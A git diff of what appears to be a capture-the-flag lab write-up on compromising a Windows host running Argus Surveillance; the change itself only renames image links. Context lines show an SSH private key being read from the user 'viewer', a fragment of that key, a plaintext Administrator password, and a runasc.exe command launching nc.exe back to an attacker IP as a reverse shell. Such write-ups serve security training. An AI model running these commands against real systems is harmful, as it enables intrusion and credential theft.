@@ -32,7 +32,7 @@ SSH is open on this Windows machine, so let's take note of that.
 
 Port 8080 hosted an Argus Surveillance instance:
 
-![](<../../../.gitbook/assets/image%20(1766).png>)
+![](../../../.gitbook/assets/dvr4-2.png)
 
 There are quite a few exploits for this software:
 
@@ -70,7 +70,7 @@ timer=timer.drv
 
 It works, so now we just need to find out what to read. I know that SSH is open, so we should be looking for a SSH private key of some user. On the website, we can view the users to see 2:
 
-![](<../../../.gitbook/assets/image%20(96).png>)
+![](../../../.gitbook/assets/dvr4-4.png)
 
 `viewer` is one them, and we can try to read their private key:
 
@@ -86,7 +86,7 @@ Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP
 
 Using this, we can `ssh` into the machine as `viewer`:
 
-![](<../../../.gitbook/assets/image%20(3135).png>)
+![](../../../.gitbook/assets/dvr4-3.png)
 
 ## Privilege Escalation
 
@@ -169,4 +169,4 @@ C:\Windows\Tasks>.\runasc.exe Administrator 14WatchD0g$ "C:\Windows\Tasks\nc.exe
 92.168.45.191 21"
 ```
 
-![](<../../../.gitbook/assets/image%20(1092).png>)
+![](../../../.gitbook/assets/dvr4-1.png)
